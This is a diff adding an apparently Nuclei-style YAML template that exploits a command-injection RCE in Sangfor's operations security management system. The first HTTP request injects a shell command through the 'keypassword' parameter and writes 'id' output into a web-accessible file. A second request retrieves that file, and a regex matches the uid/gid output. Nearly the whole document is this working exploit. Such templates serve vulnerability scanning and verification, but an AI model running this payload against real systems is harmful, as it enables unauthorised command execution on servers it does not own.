@@ -1,0 +1,45 @@
+id: sangfor-osm-session-rce
+info:
+  name: 深信服运维安全管理系统 protocol_session 远程代码执行
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/60203/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: sangfor,rce,osm
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        GET /isomp-protocol/protocol/session?keyPath=/etc/passwd&protocol=ssh&keypassword=123456%27%3Bid+%3E%20/usr/local/tomcat/webapps/fort/trust/version/{{filename}}.txt;&sshd=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1817.68 Safari/537.36
+              
+      - |+
+        GET /fort/trust/version/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1817.68 Safari/537.36
+                
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body_2
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+        condition: and
